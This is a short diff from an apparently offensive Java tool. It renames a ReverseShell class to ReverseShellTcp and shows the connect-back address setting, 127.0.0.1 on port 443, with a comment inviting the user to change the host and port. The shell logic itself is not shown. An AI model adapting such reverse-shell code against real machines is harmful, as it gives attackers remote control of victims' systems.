@@ -8,7 +8,7 @@ import java.net.Socket;
 import java.net.SocketTimeoutException;
 import java.util.Arrays;
 
-public class ReverseShell {
+public class ReverseShellTcp {
     
     // change the host address and/or port number as necessary
     private static InetSocketAddress addr   = new InetSocketAddress("127.0.0.1", 443);
